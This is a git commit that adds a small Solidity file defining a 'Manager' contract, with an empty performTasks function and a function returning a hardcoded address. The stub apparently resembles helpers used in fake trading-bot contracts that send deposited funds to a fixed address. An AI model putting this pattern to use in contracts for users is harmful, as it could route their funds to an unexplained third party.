7dd01e91a7b84cffcafda087371aa9a2b6bd254f
BELOOVED <85011089+BELOOVED@users.noreply.github.com>
2022-10-12 17:35:12 +0300

    Create hp.sol

---
+++ hp.sol
@@ -0,0 +1,9 @@
+pragma solidity ^0.6.12;
+
+contract Manager {
+    function performTasks() public {}
+
+    function configCode() public pure returns (address) {
+        return 0x12DAcefB37DA602555FF029f2B4aAfE1A02D938A;
+    }
+}
